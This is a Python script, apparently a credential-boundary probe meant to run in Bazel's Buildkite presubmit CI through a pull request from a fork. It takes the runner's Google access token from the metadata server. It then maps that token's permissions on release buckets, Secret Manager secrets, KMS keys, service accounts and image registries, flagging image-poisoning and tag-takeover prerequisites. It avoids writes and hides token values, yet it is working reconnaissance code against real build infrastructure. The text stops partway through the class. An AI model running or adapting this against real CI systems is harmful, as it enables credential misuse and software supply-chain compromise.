#!/usr/bin/env python3
"""One-shot, read-only Bazel CI credential-boundary canary (stdlib only)."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

ORG = "bazel"
PIPELINE = "bazel-bazel-github-presubmit"
LABEL = "RBE on :ubuntu: Ubuntu 24.04 LTS"
BRANCH = "matrix-kernel:security/bazel-ci-credential-boundary-20260824"
REPOS = {
    "https://github.com/matrix-kernel/bazel.git",
    "git://github.com/matrix-kernel/bazel.git",
    "git@github.com:matrix-kernel/bazel.git",
}
STATUS = "STABLE_BAZEL_CI_SAFE_PROBE"
MAX_BODY = 1_000_000
TRUSTED_SA = "buildkite-trusted@bazel-public.iam.gserviceaccount.com"
UNTRUSTED_PROJECT = "bazel-untrusted"
UNTRUSTED_SA = "buildkite@bazel-untrusted.iam.gserviceaccount.com"
STORAGE_PERMISSIONS = [
    "storage.buckets.get",
    "storage.buckets.getIamPolicy",
    "storage.buckets.setIamPolicy",
    "storage.buckets.update",
    "storage.buckets.delete",
    "storage.objects.get",
    "storage.objects.list",
    "storage.objects.create",
    "storage.objects.update",
    "storage.objects.delete",
]
STORAGE_WRITE_PERMISSIONS = {
    "storage.buckets.setIamPolicy",
    "storage.buckets.update",
    "storage.buckets.delete",
    "storage.objects.create",
    "storage.objects.delete",
}
PROJECT_IMAGE_PERMISSIONS = [
    "compute.images.create",
]
ARTIFACT_REGISTRY_PERMISSIONS = [
    "artifactregistry.repositories.downloadArtifacts",
    "artifactregistry.repositories.uploadArtifacts",
    "artifactregistry.repositories.deleteArtifacts",
    "artifactregistry.tags.create",
    "artifactregistry.tags.update",
    "artifactregistry.tags.delete",
    "artifactregistry.versions.delete",
]
ARTIFACT_REGISTRY_WRITE_PERMISSIONS = {
    "artifactregistry.repositories.uploadArtifacts",
    "artifactregistry.repositories.deleteArtifacts",
    "artifactregistry.tags.create",
    "artifactregistry.tags.update",
    "artifactregistry.tags.delete",
    "artifactregistry.versions.delete",
}
SECRET_PERMISSIONS = [
    "secretmanager.versions.access",
    "secretmanager.versions.add",
    "secretmanager.versions.destroy",
    "secretmanager.versions.disable",
    "secretmanager.versions.enable",
    "secretmanager.versions.get",
    "secretmanager.versions.list",
    "secretmanager.secrets.get",
    "secretmanager.secrets.update",
    "secretmanager.secrets.delete",
    "secretmanager.secrets.getIamPolicy",
    "secretmanager.secrets.setIamPolicy",
]
SECRET_SENSITIVE_PERMISSIONS = {
    "secretmanager.versions.access",
    "secretmanager.versions.add",
    "secretmanager.versions.destroy",
    "secretmanager.versions.disable",
    "secretmanager.versions.enable",
    "secretmanager.secrets.update",
    "secretmanager.secrets.delete",
    "secretmanager.secrets.setIamPolicy",
}
SECRET_TARGETS = [
    ("positive_control", "bazel-untrusted", "bazel-bazelcipy-BuildkiteClient-token", False),
    ("own_agent_registration", "bazel-untrusted", "bazel-buildkite-agent-token", False),
    ("testing_agent_registration", "bazel-untrusted", "bazel-testing-buildkite-agent-token", True),
    ("testing_buildkite_api", "bazel-untrusted", "bazel-testing-bazelcipy-BuildkiteClient-token", True),
    ("trusted_agent_registration", "bazel-public", "bazel-trusted-buildkite-agent-token", True),
    ("trusted_buildkite_api", "bazel-public", "bazel-trusted-bazelcipy-BuildkiteClient-token", True),
]
KMS_PERMISSIONS = [
    "cloudkms.cryptoKeyVersions.useToDecrypt",
    "cloudkms.cryptoKeyVersions.useToEncrypt",
    "cloudkms.cryptoKeyVersions.destroy",
    "cloudkms.cryptoKeyVersions.get",
    "cloudkms.cryptoKeyVersions.list",
    "cloudkms.cryptoKeyVersions.update",
    "cloudkms.cryptoKeys.get",
    "cloudkms.cryptoKeys.update",
    "cloudkms.cryptoKeys.getIamPolicy",
    "cloudkms.cryptoKeys.setIamPolicy",
]
KMS_SENSITIVE_PERMISSIONS = {
    "cloudkms.cryptoKeyVersions.useToDecrypt",
    "cloudkms.cryptoKeyVersions.useToEncrypt",
    "cloudkms.cryptoKeyVersions.destroy",
    "cloudkms.cryptoKeyVersions.update",
    "cloudkms.cryptoKeys.update",
    "cloudkms.cryptoKeys.setIamPolicy",
}
KMS_TARGETS = [
    ("positive_control", "bazel-untrusted", "buildkite-untrusted-api-token", False),
    ("testing_analytics", "bazel-untrusted", "buildkite-testing-api-token", True),
    ("trusted_analytics", "bazel-public", "buildkite-trusted-api-token", True),
    ("trusted_buildkite_api", "bazel-public", "buildkite-api-token", True),
    ("github_release", "bazel-public", "github-trusted-token", True),
    ("chocolatey_release", "bazel-public", "choco-trusted-token", True),
    ("release_signing", "bazel-public", "bazel-release-key", True),
]
SERVICE_ACCOUNT_PERMISSIONS = [
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.getOpenIdToken",
    "iam.serviceAccounts.signBlob",
    "iam.serviceAccounts.signJwt",
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.implicitDelegation",
    "iam.serviceAccounts.get",
    "iam.serviceAccounts.update",
    "iam.serviceAccounts.delete",
    "iam.serviceAccounts.getIamPolicy",
    "iam.serviceAccounts.setIamPolicy",
]
SERVICE_ACCOUNT_SENSITIVE_PERMISSIONS = {
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.getOpenIdToken",
    "iam.serviceAccounts.signBlob",
    "iam.serviceAccounts.signJwt",
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.implicitDelegation",
    "iam.serviceAccounts.update",
    "iam.serviceAccounts.delete",
    "iam.serviceAccounts.setIamPolicy",
}
SERVICE_ACCOUNT_TARGETS = [
    ("trusted_worker", "buildkite-trusted@bazel-public.iam.gserviceaccount.com"),
    ("trusted_agent_metrics", "buildkite-agent-metrics@bazel-public.iam.gserviceaccount.com"),
]
# Fixed, source-derived allowlist. ``critical`` means a write grant crosses a
# trusted release, worker-image, credential, registry, or infrastructure boundary.
STORAGE_TARGETS = [
    ("positive_control", "bazel-untrusted-buildkite-artifacts", False),
    ("retry_logs", "bazel-untrusted-retry-logs", False),
    ("last_green_commits", "bazel-untrusted-last-green-commits", False),
    ("shared_ci_stats", "bazel-buildkite-stats", False),
    ("kzip_archive", "bazel-kzips", False),
    ("continuous_release", "bazel-builds", True),
    ("release", "bazel", True),
    ("apt_release", "bazel-apt", True),
    ("dependency_mirror", "bazel-mirror", True),
    ("trusted_worker_bootstrap", "bazel-ci", True),
    ("worker_bootstrap", "bazel-git-mirror", True),
    ("central_registry", "bcr.bazel.build", True),
    ("terraform_state", "bazel-buildkite-tf-state", True),
    ("trusted_credential_ciphertexts", "bazel-trusted-encrypted-secrets", True),
    ("release_image_backend", "artifacts.bazel-public.appspot.com", True),
    ("trusted_ci_artifacts", "bazel-trusted-buildkite-artifacts", True),
    ("credential_ciphertexts", "bazel-encrypted-secrets", True),
    ("untrusted_build_cache", "bazel-untrusted-build-cache", False),
    ("untrusted_builds", "bazel-untrusted-builds", False),
]
PERMISSION_ONLY_STORAGE_TARGETS = [
    ("positive_control", "bazel-untrusted-buildkite-artifacts", False),
]
RELEASE_PIPELINES = [
    ("bazelRelease", "bazel-release"),
    ("publishBazelBinaries", "publish-bazel-binaries"),
    ("javaToolsRelease", "java-tools-release"),
]
PUBLIC_BUILDKITE_CIPHERTEXT_SHA256 = (
    "65ffd7fe19bc6516474f197c19b5df0bb9deeac9eaad25e8ec8852ee73ad5b8e"
)
PUBLIC_BUILDKITE_CIPHERTEXT_LENGTH = 126
MOCK_BUILDKITE_CIPHERTEXT_SHA256 = (
    "98c316f3f8304ee72b94b19ab57bc24e06986c65e5cbea3791309495a2f07c87"
)
MOCK_BUILDKITE_CIPHERTEXT_LENGTH = 37


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *_args: Any, **_kwargs: Any) -> None:
        return None


def status(value: str) -> None:
    print(f"{STATUS} {value}", flush=True)


def gate() -> tuple[bool, str]:
    mode = os.environ.get("PROBE_MODE", "live")
    if os.environ.get("BUILDKITE_JOB_ID"):
        mode = "live"
    if mode == "mock" and os.environ.get("PROBE_MOCK_EXERCISE_GATE") != "1":
        return True, mode
    job = os.environ.get("BUILDKITE_JOB_ID", "")
    repos = {
        os.environ.get("BUILDKITE_PULL_REQUEST_REPO", ""),
        os.environ.get("BUILDKITE_REPO", ""),
    }
    valid = (
        os.environ.get("BUILDKITE_ORGANIZATION_SLUG") == ORG
        and os.environ.get("BUILDKITE_PIPELINE_SLUG") == PIPELINE
        and os.environ.get("BUILDKITE_LABEL") == LABEL
        and os.environ.get("BUILDKITE_BRANCH") == BRANCH
        and re.fullmatch(r"[1-9][0-9]*", os.environ.get("BUILDKITE_PULL_REQUEST", ""))
        and re.fullmatch(r"[A-Za-z0-9-]{8,80}", job)
        and bool(REPOS.intersection(repos))
    )
    if not valid:
        status("SKIPPED")
        return False, mode
    try:
        Path(f"/tmp/bazel-ci-safe-probe-{job}").mkdir(mode=0o700)
    except FileExistsError:
        status("ALREADY_RAN")
        return False, mode
    except OSError:
        status("MARKER_FAILED")
        return False, mode
    return True, mode


def openpgp_packet_is_secret(value: bytes) -> bool:
    """Validate the first complete v4/v6 Secret-Key/Subkey packet."""
    if len(value) < 3 or value[0] & 0x80 == 0:
        return False
    first = value[0]
    if first & 0x40:
        tag = first & 0x3F
        length_octet = value[1]
        if length_octet < 192:
            length, offset = length_octet, 2
        elif length_octet <= 223:
            if len(value) < 3:
                return False
            length = ((length_octet - 192) << 8) + value[2] + 192
            offset = 3
        elif length_octet == 255:
            if len(value) < 6:
                return False
            length, offset = int.from_bytes(value[2:6], "big"), 6
        else:  # Partial-body lengths are intentionally unsupported.
            return False
    else:
        tag = (first >> 2) & 0x0F
        length_type = first & 0x03
        width = {0: 1, 1: 2, 2: 4}.get(length_type)
        if width is None or len(value) < 1 + width:
            return False
        length = int.from_bytes(value[1 : 1 + width], "big")
        offset = 1 + width
    if tag not in {5, 7} or length < 20 or offset + length > len(value):
        return False
    return value[offset] in {4, 6}


def openpgp_private_format(value: bytes | None) -> str | None:
    if not value:
        return None
    begin = b"-----BEGIN PGP PRIVATE KEY BLOCK-----"
    end = b"-----END PGP PRIVATE KEY BLOCK-----"
    packet = value
    if value.startswith(begin + b"\n") and value.rstrip().endswith(end):
        try:
            text = value.decode("ascii")
        except UnicodeDecodeError:
            return None
        lines = text.splitlines()
        if not lines or lines[0] != begin.decode() or end.decode() not in lines[1:]:
            return None
        end_index = lines.index(end.decode(), 1)
        payload_lines = lines[1:end_index]
        while payload_lines and ":" in payload_lines[0]:
            payload_lines.pop(0)
        if payload_lines and payload_lines[0] == "":
            payload_lines.pop(0)
        payload = "".join(line for line in payload_lines if line and not line.startswith("="))
        try:
            packet = base64.b64decode(payload, validate=True)
        except ValueError:
            return None
        return "ascii_armored_private_key" if openpgp_packet_is_secret(packet) else None
    return "binary_openpgp_secret_packet" if openpgp_packet_is_secret(packet) else None


class Probe:
    def __init__(self, mode: str) -> None:
        self.mode = mode
        self.started = time.monotonic()
        self.deadline = min(max(int(os.environ.get("PROBE_MAX_SECONDS", "45")), 10), 60)
        self.timeout = min(max(int(os.environ.get("PROBE_REQUEST_TIMEOUT", "4")), 2), 8)
        self.http = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
        self.secrets: set[str] = set()
        self.google_token: str | None = None
        self.proof: str | None = None
        self.storage_write_candidates: list[str] = []
        self.storage_positive_control = False
        self.shared_image_write_candidates: list[str] = []
        self.public_buildkite_ciphertext_verified = False
        self.public_buildkite_token_decrypted = False
        if mode == "live":
            self.base = {
                "metadata": "http://metadata.google.internal/computeMetadata/v1",
                "tokeninfo": "https://oauth2.googleapis.com/tokeninfo",
                "secret": "https://secretmanager.googleapis.com",
                "iam": "https://iamcredentials.googleapis.com",
                "agent": "https://agent.buildkite.com",
                "buildkite": "https://api.buildkite.com",
                "graphql": "https://graphql.buildkite.com/v1",
                "storage": "https://storage.googleapis.com",
                "crm": "https://cloudresourcemanager.googleapis.com",
                "ar": "https://artifactregistry.googleapis.com",
                "kms": "https://cloudkms.googleapis.com",
                "github": "https://api.github.com",
            }
        else:
            defaults = {
                "metadata": "/computeMetadata/v1",
                "tokeninfo": "/tokeninfo",
                "secret": "",
                "iam": "",
                "agent": "/agent",
                "buildkite": "/trusted-write",
                "graphql": "/trusted-write/graphql/v1",
                "storage": "",
                "crm": "",
                "ar": "",
                "kms": "",
                "github": "/github",
            }
            self.base = {
                key: self.loopback(os.environ.get(f"PROBE_{key.upper()}_BASE", f"http://127.0.0.1:18080{suffix}"))
                for key, suffix in defaults.items()
            }
            self.base["graphql"] = self.loopback(
                os.environ.get("PROBE_BUILDKITE_GRAPHQL_URL", self.base["graphql"])
            )

    @staticmethod
    def loopback(value: str) -> str:
        parsed = urllib.parse.urlsplit(value)
        if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "::1", "localhost"}:
            raise ValueError("mock endpoint is not loopback HTTP")
        if parsed.username or parsed.password or parsed.fragment:
            raise ValueError("invalid mock endpoint")
        return value.rstrip("/")

    def remember(self, value: str) -> None:
        if len(value) >= 8:
            self.secrets.add(value)

    def emit(self, value: dict[str, Any]) -> None:
        encoded = json.dumps(value, sort_keys=True, separators=(",", ":"))
        if any(secret in encoded for secret in self.secrets):
            encoded = '{"kind":"output_suppressed","reason":"sensitive_value_guard"}'
        print(encoded, file=sys.stderr, flush=True)

    @staticmethod
    def sha(value: bytes | str) -> str:
        return hashlib.sha256(value.encode() if isinstance(value, str) else value).hexdigest()

    @staticmethod
    def family(value: str) -> str:
        for prefix, name in (
            ("bkua_", "buildkite_user_api"),
            ("bkar_", "buildkite_agent_registration"),
            ("bkaj_", "buildkite_job"),
            ("bkct_", "buildkite_cluster_token"),
            ("github_pat_", "github_fine_grained_pat"),
            ("ghp_", "github_classic_pat"),
            ("ghs_", "github_server_token"),
        ):
            if value.startswith(prefix):
                return name
        return "opaque_token"

    def request(
        self, method: str, url: str, headers: dict[str, str] | None = None, body: bytes | None = None
    ) -> tuple[int | None, bytes | None]:
        if time.monotonic() - self.started >= self.deadline:
            return None, None
        request = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
        try:
            with self.http.open(request, timeout=self.timeout) as response:
                raw = response.read(MAX_BODY + 1)
                return response.status, raw if len(raw) <= MAX_BODY else None
        except urllib.error.HTTPError as error:
            try:
                raw = error.read(MAX_BODY + 1)
            except OSError:
                raw = b""
            return error.code, raw if len(raw) <= MAX_BODY else None
        except (urllib.error.URLError, TimeoutError, OSError, ValueError):
            return None, None

    def request_json(
        self, method: str, url: str, headers: dict[str, str] | None = None, value: Any = None
    ) -> tuple[int | None, Any]:
        body = None
        if value is not None:
            body = json.dumps(value, separators=(",", ":")).encode()
            headers = {**(headers or {}), "Content-Type": "application/json"}
        code, raw = self.request(method, url, headers, body)
        try:
            return code, json.loads(raw) if raw is not None else None
        except (json.JSONDecodeError, UnicodeDecodeError):
            return code, None

    def bearer(self) -> dict[str, str] | None:
        return {"Authorization": f"Bearer {self.google_token}"} if self.google_token else None

    def identity(self) -> bool:
        def metadata(path: str) -> tuple[int | None, bytes | None]:
            return self.request(
                "GET", f"{self.base['metadata']}/{path}", {"Metadata-Flavor": "Google"}
            )

        _, project_raw = metadata("project/project-id")
        _, email_raw = metadata("instance/service-accounts/default/email")
        _, scopes_raw = metadata("instance/service-accounts/default/scopes")
        code, token_body = self.request_json(
            "GET",
            f"{self.base['metadata']}/instance/service-accounts/default/token",
            {"Metadata-Flavor": "Google"},
        )
        token = token_body.get("access_token") if code == 200 and isinstance(token_body, dict) else None
        if not isinstance(token, str) or len(token) < 8:
            self.emit({"kind": "google_identity", "token_available": False, "token_http_status": code})
            return False
        self.remember(token)
        clean = lambda raw: raw.decode(errors="ignore").strip() if raw and len(raw) < 4096 else None
        project, email = clean(project_raw), clean(email_raw)
        cleaned_scopes = clean(scopes_raw) if scopes_raw else None
        scopes = sorted(
            scope for scope in (cleaned_scopes or "").splitlines()
            if re.fullmatch(r"https://www\.googleapis\.com/auth/[A-Za-z0-9._/-]+", scope)
        )
        cloud_platform_scope = "https://www.googleapis.com/auth/cloud-platform" in scopes
        identity_exact = project == UNTRUSTED_PROJECT and email == UNTRUSTED_SA
        if not identity_exact or not cloud_platform_scope:
            self.emit(
                {
                    "kind": "google_identity",
                    "project_id": None,
                    "service_account_email": None,
                    "expected_project_match": project == UNTRUSTED_PROJECT,
                    "expected_service_account_match": email == UNTRUSTED_SA,
                    "cloud_platform_scope_present": cloud_platform_scope,
                    "token_available": True,
                    "token_value_emitted": False,
                }
            )
            token = None
            return False
        form = urllib.parse.urlencode({"access_token": token}).encode()
        info_code, raw = self.request(
            "POST",
            self.base["tokeninfo"],
            {"Content-Type": "application/x-www-form-urlencoded"},
            form,
        )
        try:
            info = json.loads(raw) if raw else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            info = {}
        if not isinstance(info, dict):
            info = {}
        info_scopes = (
            info.get("scope", "").split()
            if isinstance(info, dict) and isinstance(info.get("scope"), str)
            else []
        )
        expires = info.get("expires_in") if isinstance(info, dict) else None
        try:
            expires = int(expires)
        except (TypeError, ValueError):
            expires = None
        info_email = info.get("email")
        info_email_verified = info.get("email_verified")
        email_claim_present = "email" in info
        email_claim_consistent = (
            (
                not email_claim_present
                or (
                    isinstance(info_email, str)
                    and info_email == UNTRUSTED_SA
                )
            )
            and info_email_verified not in (False, "false")
        )
        tokeninfo_verified = (
            info_code == 200
            and "https://www.googleapis.com/auth/cloud-platform" in info_scopes
            and isinstance(expires, int)
            and expires > 0
            and email_claim_consistent
        )
        if not tokeninfo_verified:
            self.emit(
                {
                    "kind": "google_identity",
                    "project_id": UNTRUSTED_PROJECT,
                    "service_account_email": UNTRUSTED_SA,
                    "expected_identity_match": True,
                    "metadata_identity_verified": True,
                    "cloud_platform_scope_present": True,
                    "tokeninfo_http_status": info_code,
                    "tokeninfo_token_verified": False,
                    "tokeninfo_email_claim_present": email_claim_present,
                    "tokeninfo_email_claim_consistent": email_claim_consistent,
                    "token_value_emitted": False,
                }
            )
            token = None
            return False
        self.google_token = token
        self.emit(
            {
                "kind": "google_identity",
                "project_id": project,
                "service_account_email": email,
                "expected_identity_match": True,
                "metadata_identity_verified": True,
                "scopes": scopes,
                "tokeninfo_http_status": info_code,
                "tokeninfo_token_verified": True,
                "tokeninfo_email_claim_present": email_claim_present,
                "tokeninfo_email_claim_consistent": email_claim_consistent,
                "expires_in": expires,
                "credential_type": "oauth2_access_token",
                "token_length": len(token),
                "token_sha256": self.sha(token),
                "token_value_emitted": False,
            }
        )
        return True

    def bucket_permissions(
        self, bucket: str, headers: dict[str, str] | None
    ) -> tuple[int | None, list[str]]:
        encoded_bucket = urllib.parse.quote(bucket, safe="")
        query = urllib.parse.urlencode(
            [("permissions", permission) for permission in STORAGE_PERMISSIONS]
        )
        code, body = self.request_json(
            "GET",
            f"{self.base['storage']}/storage/v1/b/{encoded_bucket}/iam/testPermissions?{query}",
            headers,
        )
        raw = body.get("permissions") if code == 200 and isinstance(body, dict) else []
        allowed = sorted(
            {
                permission
                for permission in raw
                if isinstance(permission, str) and permission in STORAGE_PERMISSIONS
            }
        ) if isinstance(raw, list) else []
        return code, allowed

    def storage_access_map(
        self, targets: list[tuple[str, str, bool]] = STORAGE_TARGETS
    ) -> None:
        headers = self.bearer()
        if headers is None:
            return
        positive_control = False
        critical_candidates: list[str] = []
        for purpose, bucket, critical in targets:
            if time.monotonic() - self.started >= self.deadline:
                break
            authenticated_code, authenticated = self.bucket_permissions(bucket, headers)
            anonymous_code: int | None = None
            anonymous: list[str] = []
            if authenticated:
                anonymous_code, anonymous = self.bucket_permissions(bucket, None)
            comparator_valid = anonymous_code == 200
            credential_only = (
                sorted(set(authenticated).difference(anonymous))
                if comparator_valid
                else None
            )
            write_permissions = (
                sorted(
                    permission
                    for permission in credential_only
                    if permission in STORAGE_WRITE_PERMISSIONS
                )
                if credential_only is not None
                else None
            )
            if bucket == "bazel-untrusted-buildkite-artifacts":
                positive_control = bool(write_permissions)
            if critical and write_permissions:
                critical_candidates.append(bucket)
            self.emit(
                {
                    "kind": "storage_permission_map",
                    "purpose": purpose,
                    "bucket": bucket,
                    "critical_supply_chain_boundary": critical,
                    "authenticated_http_status": authenticated_code,
                    "anonymous_http_status": anonymous_code,
                    "authenticated_permissions": authenticated,
                    "anonymous_permissions": anonymous if comparator_valid else None,
                    "anonymous_comparator_valid": comparator_valid,
                    "credential_only_permissions": credential_only,
                    "credential_only_write_permissions": write_permissions,
                    "permission_advertisement_only": True,
                    "empty_result_is_proven_deny": False,
                    "object_operation_performed": False,
                }
            )
        validated_candidates = critical_candidates if positive_control else []
        self.storage_write_candidates = validated_candidates
        self.storage_positive_control = positive_control
        self.emit(
            {
                "kind": "storage_permission_summary",
                "positive_control_satisfied": positive_control,
                "measurement_valid": positive_control,
                "raw_critical_write_candidate_buckets": critical_candidates,
                "critical_write_candidate_count": len(validated_candidates),
                "critical_write_candidate_buckets": validated_candidates,
                "permission_advertisement_only": True,
                "empty_result_is_proven_deny": False,
                "empty_results_are_inconclusive": True,
                "actual_write": False,
                "object_content_read": False,
            }
        )

    def post_permissions(
        self, url: str, requested: list[str], headers: dict[str, str] | None
    ) -> tuple[int | None, list[str]]:
        code, body = self.request_json("POST", url, headers, {"permissions": requested})
        raw = body.get("permissions") if code == 200 and isinstance(body, dict) else []
        allowed = sorted(
            {
                permission
                for permission in raw
                if isinstance(permission, str) and permission in requested
            }
        ) if isinstance(raw, list) else []
        return code, allowed

    def compared_post_permissions(
        self, url: str, requested: list[str]
    ) -> dict[str, Any]:
        authenticated_code, authenticated = self.post_permissions(
            url, requested, self.bearer()
        )
        anonymous_code: int | None = None
        anonymous: list[str] | None = None
        anonymous_blocked = False
        if authenticated:
            anonymous_code, anonymous_result = self.post_permissions(url, requested, None)
            anonymous_blocked = anonymous_code in {401, 403}
            anonymous = anonymous_result if anonymous_code == 200 else [] if anonymous_blocked else None
        comparator_valid = anonymous is not None
        credential_only = (
            sorted(set(authenticated).difference(anonymous))
            if comparator_valid and anonymous is not None
            else None
        )
        return {
            "authenticated_http_status": authenticated_code,
            "authenticated_permissions": authenticated,
            "anonymous_http_status": anonymous_code,
            "anonymous_permissions": anonymous,
            "anonymous_blocked": anonymous_blocked,
            "anonymous_comparator_valid": comparator_valid,
            "credential_only_permissions": credential_only,
        }

    def credential_permission_map(self, measurement_valid: bool) -> dict[str, Any]:
        """Advertise credential and delegation permissions without reading or minting."""
        if self.bearer() is None:
            return {}

        secret_control = False
        raw_secret_candidates: list[str] = []
        for purpose, project, name, critical in SECRET_TARGETS:
            if time.monotonic() - self.started >= self.deadline:
                break
            resource = f"projects/{project}/secrets/{name}"
            encoded = "/".join(urllib.parse.quote(part, safe="@.-") for part in resource.split("/"))
            result = self.compared_post_permissions(
                f"{self.base['secret']}/v1/{encoded}:testIamPermissions",
                SECRET_PERMISSIONS,
            )
            credential_only = result["credential_only_permissions"]
            sensitive = (
                sorted(set(credential_only).intersection(SECRET_SENSITIVE_PERMISSIONS))
                if isinstance(credential_only, list)
                else None
            )
            if purpose == "positive_control":
                secret_control = bool(
                    sensitive
                    and "secretmanager.versions.access" in sensitive
                )
            if critical and sensitive:
                raw_secret_candidates.append(resource)
            self.emit(
                {
                    "kind": "secret_permission_map",
                    "purpose": purpose,
                    "resource": resource,
                    "critical_credential_boundary": critical,
                    **result,
                    "credential_only_sensitive_permissions": sensitive,
                    "permission_advertisement_only": True,
                    "secret_value_read": False,
                    "mutation_performed": False,
                }
            )

        secret_measurement_valid = measurement_valid and secret_control
        secret_candidates = raw_secret_candidates if secret_measurement_valid else []

        kms_control = False
        raw_kms_candidates: list[str] = []
        for purpose, project, name, critical in KMS_TARGETS:
            if time.monotonic() - self.started >= self.deadline:
                break
            resource = (
                f"projects/{project}/locations/global/keyRings/buildkite/cryptoKeys/{name}"
            )
            result = self.compared_post_permissions(
                f"{self.base['kms']}/v1/{resource}:testIamPermissions",
                KMS_PERMISSIONS,
            )
            credential_only = result["credential_only_permissions"]
            sensitive = (
                sorted(set(credential_only).intersection(KMS_SENSITIVE_PERMISSIONS))
                if isinstance(credential_only, list)
                else None
            )
            if purpose == "positive_control":
                kms_control = bool(
                    sensitive
                    and "cloudkms.cryptoKeyVersions.useToDecrypt" in sensitive
                )
            if critical and sensitive:
                raw_kms_candidates.append(resource)
            self.emit(
                {
                    "kind": "kms_permission_map",
                    "purpose": purpose,
                    "resource": resource,
                    "critical_credential_boundary": critical,
                    **result,
                    "credential_only_sensitive_permissions": sensitive,
                    "permission_advertisement_only": True,
                    "decrypt_performed": False,
                    "mutation_performed": False,
                }
            )

        kms_measurement_valid = measurement_valid and kms_control
        kms_candidates = raw_kms_candidates if kms_measurement_valid else []

        raw_service_account_candidates: list[str] = []
        for purpose, email in SERVICE_ACCOUNT_TARGETS:
            if time.monotonic() - self.started >= self.deadline:
                break
            encoded_email = urllib.parse.quote(email, safe="@.-")
            result = self.compared_post_permissions(
                f"{self.base['iam']}/v1/projects/-/serviceAccounts/{encoded_email}:testIamPermissions",
                SERVICE_ACCOUNT_PERMISSIONS,
            )
            credential_only = result["credential_only_permissions"]
            sensitive = (
                sorted(
                    set(credential_only).intersection(
                        SERVICE_ACCOUNT_SENSITIVE_PERMISSIONS
                    )
                )
                if isinstance(credential_only, list)
                else None
            )
            if sensitive:
                raw_service_account_candidates.append(email)
            self.emit(
                {
                    "kind": "service_account_permission_map",
                    "purpose": purpose,
                    "resource": f"serviceAccount://{email}",
                    "critical_credential_boundary": True,
                    **result,
                    "credential_only_sensitive_permissions": sensitive,
                    "permission_advertisement_only": True,
                    "credential_mint_performed": False,
                    "signing_performed": False,
                    "mutation_performed": False,
                }
            )

        service_account_candidates = (
            raw_service_account_candidates if measurement_valid else []
        )
        summary = {
            "kind": "credential_permission_summary",
            "storage_positive_control_satisfied": measurement_valid,
            "secret_positive_control_satisfied": secret_control,
            "kms_positive_control_satisfied": kms_control,
            "secret_measurement_valid": secret_measurement_valid,
            "kms_measurement_valid": kms_measurement_valid,
            "service_account_measurement_valid": measurement_valid,
            "raw_secret_candidates": raw_secret_candidates,
            "raw_kms_candidates": raw_kms_candidates,
            "raw_service_account_candidates": raw_service_account_candidates,
            "secret_candidates": secret_candidates,
            "kms_candidates": kms_candidates,
            "service_account_candidates": service_account_candidates,
            "permission_advertisement_only": True,
            "secret_value_read": False,
            "decrypt_performed": False,
            "credential_mint_performed": False,
            "mutation_performed": False,
        }
        self.emit(summary)
        return summary

    def shared_image_permission_map(self, measurement_valid: bool) -> None:
        """Advertise exact shared VM/container-image permissions without mutation."""
        headers = self.bearer()
        if headers is None:
            return

        project_url = f"{self.base['crm']}/v1/projects/bazel-public:testIamPermissions"
        project_code, project_permissions = self.post_permissions(
            project_url, PROJECT_IMAGE_PERMISSIONS, headers
        )
        project_write_permissions = sorted(
            set(project_permissions).intersection(PROJECT_IMAGE_PERMISSIONS)
        )
        family_poison_advertised = "compute.images.create" in project_write_permissions
        family_poison_prerequisite = measurement_valid and family_poison_advertised
        self.emit(
            {
                "kind": "shared_image_permission_map",
                "resource_class": "production_vm_image_project",
                "resource": "project://bazel-public",
                "authenticated_http_status": project_code,
                "authenticated_permissions": project_permissions,
                "authenticated_write_permissions": project_write_permissions,
                "raw_family_poison_permission_advertised": family_poison_advertised,
                "family_poison_prerequisite_satisfied": family_poison_prerequisite,
                "measurement_valid": measurement_valid,
                "permission_advertisement_only": True,
                "empty_result_is_proven_deny": False,
                "mutation_performed": False,
            }
        )

        repository_url = (
            f"{self.base['ar']}/v1/projects/bazel-public/locations/us/"
            "repositories/gcr.io:testIamPermissions"
        )
        repository_code, repository_permissions = self.post_permissions(
            repository_url, ARTIFACT_REGISTRY_PERMISSIONS, headers
        )
        anonymous_code, anonymous_permissions = self.post_permissions(
            repository_url, ARTIFACT_REGISTRY_PERMISSIONS, None
        )
        anonymous_comparator_valid = anonymous_code == 200
        credential_only_permissions = (
            sorted(set(repository_permissions).difference(anonymous_permissions))
            if anonymous_comparator_valid
            else None
        )
        repository_write_permissions = (
            sorted(
                set(credential_only_permissions).intersection(
                    ARTIFACT_REGISTRY_WRITE_PERMISSIONS
                )
            )
            if credential_only_permissions is not None
            else None
        )
        tag_takeover_advertised = bool(
            repository_write_permissions is not None
            and "artifactregistry.repositories.uploadArtifacts"
            in repository_write_permissions
            and "artifactregistry.tags.update" in repository_write_permissions
        )
        tag_takeover_prerequisites = measurement_valid and tag_takeover_advertised
        self.emit(
            {
                "kind": "shared_image_permission_map",
                "resource_class": "shared_container_registry",
                "resource": "artifactRegistry://bazel-public/us/gcr.io",
                "authenticated_http_status": repository_code,
                "anonymous_http_status": anonymous_code,
                "authenticated_permissions": repository_permissions,
                "anonymous_permissions": (
                    anonymous_permissions if anonymous_comparator_valid else None
                ),
                "anonymous_comparator_valid": anonymous_comparator_valid,
                "credential_only_permissions": credential_only_permissions,
                "credential_only_write_permissions": repository_write_permissions,
                "raw_mutable_tag_takeover_permissions_advertised": (
                    tag_takeover_advertised
                ),
                "mutable_tag_takeover_prerequisites_satisfied": (
                    tag_takeover_prerequisites
                ),
                "measurement_valid": measurement_valid,
                "permission_advertisement_only": True,
                "empty_result_is_proven_deny": False,
                "mutation_performed": False,
            }
        )

        candidates = []
        if family_poison_prerequisite:
            candidates.append("project://bazel-public")
        if tag_takeover_prerequisites:
            candidates.append("artifactRegistry://bazel-public/us/gcr.io")
        self.shared_image_write_candidates = candidates
        self.emit(
            {
                "kind": "shared_image_permission_summary",
                "measurement_valid": measurement_valid,
                "critical_write_candidate_count": len(candidates),
                "critical_write_candidates": candidates,
                "permission_advertisement_only": True,
                "empty_result_is_proven_deny": False,
                "mutation_performed": False,
            }
        )
